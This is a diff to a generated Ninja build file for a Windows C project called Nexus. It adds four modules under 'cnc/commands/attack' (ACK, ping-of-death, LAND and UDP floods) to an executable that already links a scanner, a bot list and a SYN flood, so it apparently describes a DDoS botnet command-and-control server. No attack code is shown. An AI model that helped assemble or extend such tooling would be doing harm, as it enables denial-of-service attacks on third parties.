@@ -109,6 +109,30 @@ build CMakeFiles/Nexus.dir/cnc/commands/info/whois.c.obj: C_COMPILER__Nexus_unsc
   OBJECT_DIR = CMakeFiles\Nexus.dir
   OBJECT_FILE_DIR = CMakeFiles\Nexus.dir\cnc\commands\info
 
+build CMakeFiles/Nexus.dir/cnc/commands/attack/ack_command.c.obj: C_COMPILER__Nexus_unscanned_Debug C$:/Users/buldu/Desktop/Nexus/cnc/commands/attack/ack_command.c || cmake_object_order_depends_target_Nexus
+  DEP_FILE = CMakeFiles\Nexus.dir\cnc\commands\attack\ack_command.c.obj.d
+  FLAGS = -g -std=gnu2x -fdiagnostics-color=always
+  OBJECT_DIR = CMakeFiles\Nexus.dir
+  OBJECT_FILE_DIR = CMakeFiles\Nexus.dir\cnc\commands\attack
+
+build CMakeFiles/Nexus.dir/cnc/commands/attack/pod_command.c.obj: C_COMPILER__Nexus_unscanned_Debug C$:/Users/buldu/Desktop/Nexus/cnc/commands/attack/pod_command.c || cmake_object_order_depends_target_Nexus
+  DEP_FILE = CMakeFiles\Nexus.dir\cnc\commands\attack\pod_command.c.obj.d
+  FLAGS = -g -std=gnu2x -fdiagnostics-color=always
+  OBJECT_DIR = CMakeFiles\Nexus.dir
+  OBJECT_FILE_DIR = CMakeFiles\Nexus.dir\cnc\commands\attack
+
+build CMakeFiles/Nexus.dir/cnc/commands/attack/land_command.c.obj: C_COMPILER__Nexus_unscanned_Debug C$:/Users/buldu/Desktop/Nexus/cnc/commands/attack/land_command.c || cmake_object_order_depends_target_Nexus
+  DEP_FILE = CMakeFiles\Nexus.dir\cnc\commands\attack\land_command.c.obj.d
+  FLAGS = -g -std=gnu2x -fdiagnostics-color=always
+  OBJECT_DIR = CMakeFiles\Nexus.dir
+  OBJECT_FILE_DIR = CMakeFiles\Nexus.dir\cnc\commands\attack
+
+build CMakeFiles/Nexus.dir/cnc/commands/attack/udp_command.c.obj: C_COMPILER__Nexus_unscanned_Debug C$:/Users/buldu/Desktop/Nexus/cnc/commands/attack/udp_command.c || cmake_object_order_depends_target_Nexus
+  DEP_FILE = CMakeFiles\Nexus.dir\cnc\commands\attack\udp_command.c.obj.d
+  FLAGS = -g -std=gnu2x -fdiagnostics-color=always
+  OBJECT_DIR = CMakeFiles\Nexus.dir
+  OBJECT_FILE_DIR = CMakeFiles\Nexus.dir\cnc\commands\attack
+
 
 # =============================================================================
 # Link build statements for EXECUTABLE target Nexus
@@ -117,7 +141,7 @@ build CMakeFiles/Nexus.dir/cnc/commands/info/whois.c.obj: C_COMPILER__Nexus_unsc
 #############################################
 # Link the executable Nexus.exe
 
-build Nexus.exe: C_EXECUTABLE_LINKER__Nexus_Debug CMakeFiles/Nexus.dir/cnc/server.c.obj CMakeFiles/Nexus.dir/cnc/commands/cman.c.obj CMakeFiles/Nexus.dir/cnc/commands/help_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/echo_command.c.obj CMakeFiles/Nexus.dir/scanner/scanner.c.obj CMakeFiles/Nexus.dir/cnc/commands/bots_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/Attack_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/attack/syn_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/info/ping_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/info/whois.c.obj
+build Nexus.exe: C_EXECUTABLE_LINKER__Nexus_Debug CMakeFiles/Nexus.dir/cnc/server.c.obj CMakeFiles/Nexus.dir/cnc/commands/cman.c.obj CMakeFiles/Nexus.dir/cnc/commands/help_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/echo_command.c.obj CMakeFiles/Nexus.dir/scanner/scanner.c.obj CMakeFiles/Nexus.dir/cnc/commands/bots_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/Attack_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/attack/syn_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/info/ping_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/info/whois.c.obj CMakeFiles/Nexus.dir/cnc/commands/attack/ack_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/attack/pod_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/attack/land_command.c.obj CMakeFiles/Nexus.dir/cnc/commands/attack/udp_command.c.obj
   FLAGS = -g
   LINK_LIBRARIES = -lkernel32 -luser32 -lgdi32 -lwinspool -lshell32 -lole32 -loleaut32 -luuid -lcomdlg32 -ladvapi32
   OBJECT_DIR = CMakeFiles\Nexus.dir
